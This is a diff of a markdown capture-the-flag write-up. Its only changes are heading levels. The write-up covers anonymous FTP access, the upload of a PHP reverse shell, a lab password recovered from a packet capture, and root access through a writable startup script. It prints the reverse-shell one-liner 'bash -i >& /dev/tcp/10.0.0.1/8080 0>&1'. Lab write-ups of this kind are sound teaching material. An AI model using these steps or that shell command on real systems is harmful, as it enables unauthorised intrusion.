@@ -3,7 +3,7 @@
 ### Goal: own root
 ### Information given: ip, not much else
 
-##### Enumeration:
+#### Enumeration:
     - nmap:
     - open ports:
         - 21: ftp      vsftpd 3.0.3
@@ -13,21 +13,21 @@
     - OS: linux kernel
     - nothing great to get from the website
 
-##### identifying vulnerabilities:
+#### identifying vulnerabilities:
     - ftp login didn't get much either other than amongus memes
     - possible user: Maya
     - the ftp fileshare is accessible from the http://<target_ip>/files folder
         - try to put a php webshell in there and run it in the browser
 
 
-##### exploit:
+#### exploit:
     - ftp in as user ftp, no password
     - ftp folder is writable, so we can put pentestmonkey's php reverse shell there and load it through a web browser or curl
     - FOOTHOLD: got a terminal as www-data
 
-###### cat /recipe.txt for the first flag
+##### cat /recipe.txt for the first flag
 
-##### privilege escalation/lateral movement
+#### privilege escalation/lateral movement
     - etc/passwd lists a user named *lennie*
     - root folder has security incidents folder
     - in the /incidents/suspicious.pcapng
@@ -37,7 +37,7 @@
         - p: c4ntg3t3n0ughsp1c3
         - now I can ssh in as lennie
 
-###### cat /home/lennie/user.txt for second flag
+#### cat /home/lennie/user.txt for second flag
 
     - /home/lennie/scripts
         - lennie is able to run the planner.sh but doesn't have permission to change startup.txt or planner.sh
@@ -51,4 +51,4 @@
         - bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
         - I caught it with netcat and got a root terminal!!
 
-###### cat /root/root.txt for the third flag
+##### cat /root/root.txt for the third flag
